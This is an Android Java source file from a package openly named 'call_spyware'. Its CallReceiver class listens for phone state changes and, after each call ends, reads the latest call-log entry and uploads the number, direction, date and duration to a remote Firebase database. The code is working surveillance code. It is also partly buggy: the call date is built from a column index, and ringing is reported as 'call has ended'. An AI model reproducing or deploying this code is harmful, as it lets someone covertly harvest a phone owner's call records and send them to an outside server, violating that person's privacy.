package com.ngpmbewetu.call_spyware;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Handler;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.view.Gravity;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Date;

public class CallReceiver extends BroadcastReceiver {
    DatabaseReference reff;
    call_Info call_info;
    Date callDayTime;
    String dir;

    @Override
    public void onReceive(final Context context, Intent intent) {

        // call started
        reff = FirebaseDatabase.getInstance().getReference().child("callInfo");
        call_info = new call_Info();
        if (intent.getStringExtra(TelephonyManager.
                EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
            showToast(context, "call started...");
        } else if (intent.getStringExtra(TelephonyManager.
                EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_IDLE)) {
            showToast(context, "call has ended...");

            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    LastCall(context);
                }
            }, 500);
        } else if (intent.getStringExtra(TelephonyManager.
                EXTRA_STATE).equals(TelephonyManager.EXTRA_STATE_RINGING)) {
            showToast(context, "call has ended...");
        }


    }

    void showToast(Context context, String message) {
        Toast toast = Toast.makeText(context, message, Toast.LENGTH_LONG);
        toast.setGravity(Gravity.CENTER, 0, 0);
        toast.show();
    }

    public String LastCall(Context context) {
        StringBuffer sb = new StringBuffer();

        @SuppressLint("MissingPermission") Cursor cur = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");

        int number = cur.getColumnIndex(CallLog.Calls.NUMBER);
        int duration = cur.getColumnIndex(CallLog.Calls.DURATION);
        int type = cur.getColumnIndex(CallLog.Calls.TYPE);
        int date = cur.getColumnIndex(CallLog.Calls.DATE);
        int name = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
        callDayTime = new Date(Long.valueOf(date));
        sb.append("Call Details : \n");
        while (cur.moveToNext()) {
            String phNumber = cur.getString(number);
            String callDuration = cur.getString(duration);
            String nm = cur.getString(name);


            Toast.makeText(context, "" + callDuration, Toast.LENGTH_SHORT).show();
            Toast.makeText(context, "" + phNumber, Toast.LENGTH_SHORT).show();
            Toast.makeText(context, "" + nm, Toast.LENGTH_SHORT).show();
            Toast.makeText(context, "" + date, Toast.LENGTH_SHORT).show();
            Toast.makeText(context, "" + type, Toast.LENGTH_SHORT).show();

            int dircode = Integer.parseInt(String.valueOf(type));
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
                sb.append("\nPhone Number:" + phNumber);


                call_info.setPhnumber(phNumber);
                call_info.setCall_type(dir);
                call_info.setCall_date(callDayTime);
                call_info.setCall_duration(callDuration);
                reff.push().setValue(call_info);
                Toast.makeText(context, "data inserted succesfully", Toast.LENGTH_SHORT).show();

                break;
            }
            cur.close();
            String str = sb.toString();


            return str;
        }

}

